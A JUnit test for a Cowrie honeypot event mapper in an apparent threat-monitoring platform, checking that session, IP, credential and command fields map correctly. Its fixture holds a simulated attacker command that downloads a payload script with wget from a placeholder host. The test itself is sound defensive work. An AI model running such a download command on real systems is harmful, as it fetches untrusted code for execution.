package users.rishik.threatPlatform.attack;

import org.junit.jupiter.api.Test;
import users.rishik.threatPlatform.attack.dto.RawCowrieEvent;
import users.rishik.threatPlatform.attack.dto.SourceType;
import users.rishik.threatPlatform.attack.dto.ThreatObservation;
import users.rishik.threatPlatform.attack.mapper.CowrieObservationMapper;

import static org.junit.jupiter.api.Assertions.assertEquals;

class CowrieObservationMapperTest {

    @Test
    void shouldMapCowrieEventToThreatObservation() {

        RawCowrieEvent event = new RawCowrieEvent(
                "2025-06-27T10:15:30Z",
                54321,
                "10.0.0.10",
                22,
                "cowrie.command.input",
                "session-123",
                "sensor-1",
                1,
                "root",
                "password",
                "wget http://example.com/payload.sh",
                null,
                null,
                "ssh",
                "hassh-value",
                null,
                null,
                null,
                null,
                null,
                "abc123",
                null,
                null,
                null,
                "10.0.0.5",
                "10.0.0.10"
        );

        CowrieObservationMapper mapper = new CowrieObservationMapper();

        ThreatObservation observation = mapper.map(event);

        assertEquals(
                "session-123-2025-06-27T10:15:30Z",
                observation.getObservationId()
        );

        assertEquals(
                SourceType.COWRIE,
                observation.getSourceType()
        );

        assertEquals(
                event.ts(),
                observation.getTimestamp().toString()
        );

        assertEquals("sensor-1", observation.getSensorId());

        assertEquals("10.0.0.5", observation.getSourceIp());
        assertEquals(54321, observation.getSourcePort());

        assertEquals("10.0.0.10", observation.getDestinationIp());
        assertEquals(22, observation.getDestinationPort());

        assertEquals("ssh", observation.getProtocol());

        assertEquals(
                "cowrie.command.input",
                observation.getActivityType()
        );

        assertEquals("session-123", observation.getSessionId());

        assertEquals(
                "wget http://example.com/payload.sh",
                observation.getCommand()
        );

        assertEquals("abc123", observation.getFileHash());

        assertEquals("hassh-value", observation.getClientFingerprint());

        assertEquals("root", observation.getUsername());
    }
}